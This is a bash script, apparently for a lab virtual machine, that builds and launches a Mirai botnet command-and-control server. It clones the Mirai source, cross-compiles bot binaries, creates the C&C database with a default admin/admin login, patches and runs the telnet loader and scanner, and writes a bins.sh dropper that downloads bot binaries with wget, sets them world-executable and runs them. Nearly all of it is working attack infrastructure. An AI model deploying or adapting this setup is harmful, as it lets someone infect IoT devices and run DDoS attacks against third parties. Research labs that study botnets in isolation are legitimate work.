#!/usr/bin/env bash
# init_cnc.sh
# setup instructions found: http://pastebin.com/LXkkw10AX

export DEBIAN_FRONTEND=noninteractive

# step 1
debconf-set-selections <<< 'mysql-server mysql-server/root_password password password'
debconf-set-selections <<< 'mysql-server mysql-server/root_password_again password password'
apt-get install -y apache2 gcc golang electric-fence git mysql-server mysql-client tmux

cd /root
git clone https://github.com/jgamblin/Mirai-Source-Code.git


# step 2
mkdir /etc/xcompile
cd /etc/xcompile
cp -R /mnt/vagrant/cross-compilers/* /etc/xcompile 


# step 3
cat >> /root/.bashrc << EOF
export PATH=\$PATH:/etc/xcompile/armv4l/bin
export PATH=\$PATH:/etc/xcompile/armv6l/bin
export PATH=\$PATH:/etc/xcompile/i586/bin
export PATH=\$PATH:/etc/xcompile/m68k/bin
export PATH=\$PATH:/etc/xcompile/mips/bin
export PATH=\$PATH:/etc/xcompile/mipsel/bin
export PATH=\$PATH:/etc/xcompile/powerpc/bin
export PATH=\$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=\$PATH:/etc/xcompile/sh4/bin
export PATH=\$PATH:/etc/xcompile/sparc/bin
export PATH=\$PATH:/etc/xcompile/armv5l/bin
export PATH=\$PATH:/etc/xcompile/i686/bin
export PATH=\$PATH:/usr/local/go/bin
export GOPATH=/root/Documents/go
EOF

source /root/.bashrc

# grab updated go package
wget https://dl.google.com/go/go1.10.3.linux-amd64.tar.gz
tar xvf go1.10.3.linux-amd64.tar.gz
mv go /usr/local
rm /usr/bin/go
ln -s /usr/local/go/bin/go /usr/bin/go


# step 4
go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords

sed -i 's/(o1 == 10)/\/\/(o1 == 10)/' /root/Mirai-Source-Code/mirai/bot/scanner.c
if [[ -z $(grep "127.0.0.1:3306" /root/Mirai-Source-Code/mirai/cnc/main.go) ]]; then 
    sed -i 's/127.0.0.1/127.0.0.1:3306/' /root/Mirai-Source-Code/mirai/cnc/main.go
fi

cd /root/Mirai-Source-Code/mirai
mkdir debug
mkdir release
cp prompt.txt debug/
cp prompt.txt release/
./build.sh debug telnet
./build.sh release telnet

# copy mirai to /mnt/vagrant for bot
cp /root/Mirai-Source-Code/mirai/debug/mirai.dbg /mnt/vagrant/


# setup web server
service apache2 start
cd /root/Mirai-Source-Code/mirai/release
cp mirai.* /var/www/html
rm /var/www/html/index.html

cat > /var/www/html/bins.sh << EOF
#!/bin/sh

# Edit
WEBSERVER="10.0.0.10:80"
# Stop editing now


BINARIES="mirai.arm mirai.m68k mirai.mips mirai.mpsl mirai.ppc mirai.sh4 mirai.x86 mirai.spc"

for Binary in $BINARIES; do
    wget http://$WEBSERVER/$Binary -O dvrHelper
    chmod 777 dvrHelper
    ./dvrHelper
done

rm -f *
EOF

service apache2 restart

# step 5

# use default domains...

# step 6 
mysql -u root --password=password << EOF
CREATE DATABASE mirai;
use mirai
CREATE TABLE \`history\` (
  \`id\` int(10) unsigned NOT NULL AUTO_INCREMENT,
  \`user_id\` int(10) unsigned NOT NULL,
  \`time_sent\` int(10) unsigned NOT NULL,
  \`duration\` int(10) unsigned NOT NULL,
  \`command\` text NOT NULL,
  \`max_bots\` int(11) DEFAULT '-1',
  PRIMARY KEY (\`id\`),
  KEY \`user_id\` (\`user_id\`)
);
 
CREATE TABLE \`users\` (
  \`id\` int(10) unsigned NOT NULL AUTO_INCREMENT,
  \`username\` varchar(32) NOT NULL,
  \`password\` varchar(32) NOT NULL,
  \`duration_limit\` int(10) unsigned DEFAULT NULL,
  \`cooldown\` int(10) unsigned NOT NULL,
  \`wrc\` int(10) unsigned DEFAULT NULL,
  \`last_paid\` int(10) unsigned NOT NULL,
  \`max_bots\` int(11) DEFAULT '-1',
  \`admin\` int(10) unsigned DEFAULT '0',
  \`intvl\` int(10) unsigned DEFAULT '30',
  \`api_key\` text,
  PRIMARY KEY (\`id\`),
  KEY \`username\` (\`username\`)
);
 
CREATE TABLE \`whitelist\` (
  \`id\` int(10) unsigned NOT NULL AUTO_INCREMENT,
  \`prefix\` varchar(16) DEFAULT NULL,
  \`netmask\` tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (\`id\`),
  KEY \`prefix\` (\`prefix\`)
);
 
INSERT INTO users VALUES (NULL, 'admin', 'admin', 0, 0, 0, 0, -1, 1, 30, '');
EOF


# step 7
# defaults are good in main.go (db settings)
service mysql restart
tmux new-session -d -s cnc '/root/Mirai-Source-Code/mirai/debug/cnc'


# step 8
rm -rf /root/Mirai-Source-Code/dlr/release
sed -i 's/utils_inet_addr(127,0,0,1)/utils_inet_addr(10,0,0,10)/' /root/Mirai-Source-Code/dlr/main.c
cd /root/Mirai-Source-Code/dlr
mkdir release
chmod +x build.sh
./build.sh

cat > /tmp/main.patch << EOF
--- main.c      2017-02-16 03:37:04.082419514 +0000
+++ main.c.fix  2017-02-16 03:39:50.549615005 +0000
@@ -31,11 +31,10 @@
     addrs = calloc(4, sizeof (ipv4_t));
     addrs[0] = inet_addr("0.0.0.0");
 #else
-    addrs_len = 2;
+    addrs_len = 1;
     addrs = calloc(addrs_len, sizeof (ipv4_t));
-
-    addrs[0] = inet_addr("192.168.0.1"); // Address to bind to
-    addrs[1] = inet_addr("192.168.1.1"); // Address to bind to
+ 
+    addrs[0] = inet_addr("0.0.0.0");
 #endif
 
     if (argc == 2)
@@ -50,7 +49,7 @@
     }
 
     /*                                                                                   wget address           tftp address */
-    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "100.200.100.100", 80, "100.200.100.100")) == NULL)
+   if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "10.0.0.10", 80, "10.0.0.10")) == NULL) 
     {
         printf("Failed to initialize server. Aborting\n");
         return 1;
EOF

cat > /tmp/server.patch << EOF
--- server.c    2017-04-12 23:27:10.000000000 -0400
+++ server.c.new    2017-04-12 23:33:53.000000000 -0400
@@ -288,7 +288,7 @@
                         consumed = connection_consume_login_prompt(conn);
                         if (consumed)
                         {
-                            util_sockprintf(conn->fd, "%s", conn->info.user);
+                            util_sockprintf(conn->fd, "%s\r\n", conn->info.user);
                             strcpy(conn->output_buffer.data, "\r\n");
                             conn->output_buffer.deadline = time(NULL) + 1;
                             conn->state_telnet = TELNET_PASS_PROMPT;
@@ -298,7 +298,7 @@
                         consumed = connection_consume_password_prompt(conn);
                         if (consumed)
                         {
-                            util_sockprintf(conn->fd, "%s", conn->info.pass);
+                            util_sockprintf(conn->fd, "%s\r\n", conn->info.pass);
                             strcpy(conn->output_buffer.data, "\r\n");
                             conn->output_buffer.deadline = time(NULL) + 1;
                             conn->state_telnet = TELNET_WAITPASS_PROMPT; // At the very least it will print SOMETHING
EOF

patch /root/Mirai-Source-Code/loader/src/main.c /tmp/main.patch
patch /root/Mirai-Source-Code/loader/src/server.c /tmp/server.patch
cd /root/Mirai-Source-Code/loader/
./build.debug.sh
./build.sh

#route del default

cd /root
wget https://dl.google.com/go/go1.10.3.linux-amd64.tar.gz

# create swapfile
dd if=/dev/zero of=/swapfile bs=4M count=1250
mkswap /swapfile
chmod 600 /swapfile
swapon /swapfile
echo /swapfile swap swap defaults 0 0 >> /etc/fstab

# start scan
cd /root/Mirai-Source-Code/loader/
tmux new-session -d -s scan "../mirai/debug/scanListen | ./loader.dbg"

# fix mirai URLs
mkdir /var/www/html/bins
cp /var/www/html/mirai* /var/www/html/bins/


